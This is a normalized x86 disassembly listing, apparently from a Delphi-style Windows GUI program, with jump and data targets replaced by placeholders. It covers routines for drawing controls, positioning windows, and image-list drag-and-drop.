mov eax [ eax + 0x170 ]
call sub_41d618
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42f548
call sub_42f628
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42f548
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42fd74
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4447e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069fc
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43ca64
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_440ff4
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43e0d4
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_43f298
sub_444854
push ebx
push esi
mov esi edx
call sub_453eac
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406998
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43e0d4
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406998
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43e0d4
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4448b8
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_4413bc
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4448f0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4448e8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444930
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c020
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43bafc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_44498c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c0f8
test bl bl
jle r-xdata
xor eax eax
call sub_43a0f0
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4449cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41da38
xor eax eax
push ebp
push sub_444a67
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41ddac
xor eax eax
push ebp
push sub_444a44
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444a4b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41ddac
retn
sub_444a78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4453b0
mov edx 0x80ffff
mov eax esi
call sub_43d0c0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41dc4c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d700
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_444ae4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_440594
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bf28
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44052c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_444b50
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_444ba6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444bad
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ReleaseDC
retn
sub_444bb4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_444c4d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41ce18
mov eax ebx
call sub_43f240
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x14 ]
call sub_404468
push eax
mov eax [ ebx + 0x208 ]
call sub_41dd2c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c54
lea eax [ ebp - 0x14 ]
call sub_403fa8
retn
sub_444c5c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_444cc8
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_444d53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444d5a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41db8c
mov edx eax
add edx 0x6
mov eax esi
call sub_43c6dc
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43cf20
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41dba8
mov edx eax
add edx 0x4
mov eax esi
call sub_43c700
sub_444d60
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_444f39
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43cf50
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43e178
mov eax [ esi ]
call sub_45a6e4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45a6f0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45a6e4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45a6d8
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45a6f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45a6cc
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45a6d8
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45a6cc
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_440e3c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444f40
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404268
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_447ff8
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call [ rw-data ]
sub_444f48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_444f70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412b10
mov eax esi
call sub_43f240
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
mov eax [ esi + 0x208 ]
call sub_41dd2c
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_444fcc
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412b10
call sub_42f548
call sub_42f628
test al al
jne r-xdata
call sub_42f548
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42f9e8
push esp
push 0x1
push 0xf
push 0x0
call sub_42f548
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42f6e8
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_445038
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_441744
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_44505c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4450b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445174
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45abb8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4245d8
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45abb8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4245d8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_445180
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44a02c
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4451e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44aca0
mov eax ebx
call sub_449e58
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_44520c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_449e58
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_4450b4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_44526c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_445180
push 0x0
call ShowCursor
sub_44526c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_449e58
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_4452d0
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44505c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_4452d0
push ebx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_4452f4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_449e58
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_44505c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_445368
push ebx
push esi
mov esi eax
mov eax esi
call sub_449e58
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_4452d0
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_4451c8
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4453b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f434
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43bafc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_44540c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43f558
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_44545c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41da38
xor eax eax
push ebp
push sub_4454fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41ddac
xor eax eax
push ebp
push sub_4454d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43bb14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4454de
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41ddac
retn
sub_44550c
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4455a0
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_445528
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4455a0
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_445b98
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_4455a0
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4455d4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_445664
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov edx 0x2
call sub_445664
jmp r-xdata
retn
sub_44561c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4456d0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
mov edx 0x2
call sub_4456d0
jmp r-xdata
retn
sub_445664
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_445a98
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4456d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_445584
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_445a98
push eax
mov eax esi
call sub_4455d4
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_445a98
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_445780
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_445584
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_445b98
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4456d0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_445584
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4456d0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4455d4
mov edx eax
add edx esi
mov eax ebx
call sub_445ac0
mov edx edi
mov eax ebx
call sub_445ac0
jmp r-xdata
mov eax ebx
call sub_445920
mov eax ebx
call sub_445b70
mov ebx eax
test ebx ebx
jne r-xdata
sub_445828
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403fa8
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403ffc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
